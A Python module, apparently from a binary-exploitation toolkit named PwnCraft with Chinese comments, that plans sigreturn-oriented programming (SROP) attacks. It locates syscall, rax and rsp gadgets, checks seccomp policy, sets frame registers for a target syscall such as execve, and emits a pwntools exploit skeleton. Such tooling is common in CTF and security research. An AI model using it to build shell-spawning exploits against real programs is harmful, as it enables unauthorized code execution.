"""SROP Builder (Phase 3 收口, BUILD 规划 §八/§十三).

The builder models the *plan* only: trigger conditions, required control
points, seccomp verdicts and the frame register assignments.  The binary
layout of the sigreturn frame is never fabricated here — the generated EXP
delegates it to pwntools' ``SigreturnFrame`` at runtime, which is the same
truth source every other emitted payload uses.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Mapping, Sequence

from .gadgets import Gadget
from .syscalls import lookup_syscall, seccomp_verdict
from .workbench import SyscallPlanner

RT_SIGRETURN = {"amd64": (15, "rt_sigreturn")}
FRAME_PLACEHOLDER = "FRAME_ADDR"


@dataclass
class SigreturnPlan:
    architecture: str
    target_name: str
    frame_registers: dict[str, object]
    requirements: dict[str, str]
    seccomp_target: str
    seccomp_sigreturn: str
    blockers: tuple[str, ...] = ()
    warnings: tuple[str, ...] = ()
    syscall_gadget: Gadget | None = None
    rax_gadget: Gadget | None = None
    rsp_gadget: Gadget | None = None

    @property
    def ok(self) -> bool:
        return not self.blockers

    @property
    def executable(self) -> bool:
        return self.ok and self.seccomp_target == "ALLOWED" and self.seccomp_sigreturn == "ALLOWED"

    def to_dict(self) -> dict[str, object]:
        return {
            "architecture": self.architecture,
            "target": self.target_name,
            "frame_registers": dict(self.frame_registers),
            "requirements": dict(self.requirements),
            "seccomp_target": self.seccomp_target,
            "seccomp_sigreturn": self.seccomp_sigreturn,
            "blockers": list(self.blockers),
            "warnings": list(self.warnings),
            "syscall_gadget": self.syscall_gadget.to_dict() if self.syscall_gadget else None,
            "rax_gadget": self.rax_gadget.to_dict() if self.rax_gadget else None,
            "rsp_gadget": self.rsp_gadget.to_dict() if self.rsp_gadget else None,
            "ok": self.ok,
            "executable": self.executable,
        }


class SROPBuilder:
    """Plan a sigreturn frame from provable gadget/seccomp facts."""

    def __init__(self, *, bits: int = 64, seccomp_policy: Mapping[str, str] | None = None, gadgets: Sequence[Gadget] = ()):
        self.bits = int(bits)
        self.architecture = "amd64" if self.bits == 64 else "i386"
        self.seccomp_policy = dict(seccomp_policy or {})
        self.gadgets = tuple(gadgets)

    # ------------------------------------------------------------------
    def _find_syscall_gadget(self) -> Gadget | None:
        candidates = [g for g in self.gadgets if any("syscall" in ins for ins in g.instructions)]
        with_ret = [g for g in candidates if g.instructions[-1].lower().split()[0] == "ret"]
        pool = with_ret or candidates
        return max(pool, key=lambda item: item.score) if pool else None

    def _find_rax_gadget(self) -> Gadget | None:
        for gadget in sorted(self.gadgets, key=lambda item: -item.score):
            if "rax" in gadget.controls and not gadget.memory_side_effect:
                return gadget
        return None

    def _find_rsp_gadget(self) -> Gadget | None:
        for gadget in sorted(self.gadgets, key=lambda item: -item.score):
            if "rsp" in gadget.controls and not gadget.memory_side_effect:
                return gadget
        for gadget in self.gadgets:
            if tuple(ins.strip().lower() for ins in gadget.instructions) == ("leave", "ret"):
                return gadget
        return None

    def plan(self, target: str = "execve", arguments: Mapping[str, object] | None = None) -> SigreturnPlan:
        if self.architecture != "amd64":
            return SigreturnPlan(
                self.architecture,
                str(target),
                {},
                {},
                "UNKNOWN",
                "UNKNOWN",
                (f"SROP 目前仅支持 amd64；{self.architecture} 的 sigreturn 帧布局不同，不伪造。",),
            )
        trigger_number, trigger_name = RT_SIGRETURN["amd64"]
        spec = lookup_syscall(target, "amd64")
        blockers: list[str] = []
        warnings: list[str] = []

        # Frame contents come from the syscall spec; argument coverage is the
        # frame's job, so arg-control gadgets are deliberately NOT required.
        frame_registers: dict[str, object] = {}
        if spec is None:
            blockers.append(f"未知 syscall: {target}")
            plan_target = ""
        else:
            mapped = SyscallPlanner().plan(spec.name, dict(arguments or {}))
            frame_registers.update(mapped.registers)
            frame_registers["rax"] = spec.number
            plan_target = spec.name

        syscall_gadget = self._find_syscall_gadget()
        if syscall_gadget is None:
            blockers.append("缺少 syscall Gadget（如 `syscall ; ret`）")
        else:
            frame_registers["rip"] = syscall_gadget.address

        rax_gadget = self._find_rax_gadget()
        requirements: dict[str, str] = {}
        if rax_gadget is None:
            blockers.append("缺少 rax 控制 Gadget（触发前需要 rax=15）")
            requirements["rax=15"] = "未证明（缺 pop rax）"
        else:
            requirements["rax=15"] = f"{rax_gadget.address:#x} : {rax_gadget.text}"

        rsp_gadget = self._find_rsp_gadget()
        if rsp_gadget is None:
            blockers.append("缺少 rsp 控制（pop rsp 或 leave ; ret）把 rsp 指向帧")
            requirements["rsp→frame"] = "未证明"
        else:
            requirements["rsp→frame"] = f"{rsp_gadget.address:#x} : {rsp_gadget.text}"

        frame_registers["rsp"] = FRAME_PLACEHOLDER
        verdict_target = seccomp_verdict(self.seccomp_policy, plan_target) if plan_target else "UNKNOWN"
        verdict_sigreturn = seccomp_verdict(self.seccomp_policy, trigger_name)
        if verdict_target == "BLOCKED":
            blockers.append(f"seccomp BLOCKED: {plan_target}")
        if verdict_sigreturn == "BLOCKED":
            blockers.append(f"seccomp BLOCKED: {trigger_name}")
        if verdict_target == "UNKNOWN":
            warnings.append(f"{plan_target} 的 seccomp 判定未知；未当作允许。")
        if verdict_sigreturn == "UNKNOWN":
            warnings.append(f"{trigger_name} 的 seccomp 判定未知；未当作允许。")
        if plan_target:
            requirements[f"frame.{plan_target}"] = f"rax={spec.number}, registers={ {k: v for k, v in frame_registers.items() if k not in ('rip', 'rsp')} }"

        return SigreturnPlan(
            self.architecture,
            plan_target or str(target),
            frame_registers,
            requirements,
            verdict_target,
            verdict_sigreturn,
            tuple(blockers),
            tuple(warnings),
            syscall_gadget,
            rax_gadget,
            rsp_gadget,
        )

    # ------------------------------------------------------------------
    def to_pwntools(self, plan: SigreturnPlan, *, io_name: str = "io") -> str:
        """Emit a pwntools skeleton; the frame layout is pwntools' truth."""
        if not plan.executable:
            raise ValueError("SROP 计划不可执行；先生成可执行诊断再导出。")
        lines = [
            f"# SROP ({plan.architecture}) 生成于 PwnCraft；帧布局由 pwntools SigreturnFrame 提供",
            "frame = SigreturnFrame()",
        ]
        for register, value in plan.frame_registers.items():
            if register == "rip" and isinstance(value, int):
                lines.append(f"frame.rip = {value:#x}  # {plan.syscall_gadget.text if plan.syscall_gadget else 'syscall'}")
            elif register == "rsp":
                lines.append(f"frame.rsp = FRAME_ADDR  # {value}: 运行时确认帧放置地址")
            elif isinstance(value, int):
                lines.append(f"frame.{register} = {value:#x}")
            else:
                lines.append(f"frame.{register} = {value!r}")
        if plan.rax_gadget is not None:
            lines.append(f"# 触发 1: rax=15 ← {plan.rax_gadget.address:#x} : {plan.rax_gadget.text}")
        if plan.rsp_gadget is not None:
            lines.append(f"# 触发 2: rsp→frame ← {plan.rsp_gadget.address:#x} : {plan.rsp_gadget.text}")
        lines.append("# 触发 3: rip→syscall；帧内容经 rt_sigreturn 整体恢复")
        lines.append("# payload 按你的 rsp 控制方式组装，例如: p64(15) + bytes(frame)")
        lines.append(f"# {io_name}.send(payload)")
        return "\n".join(lines)
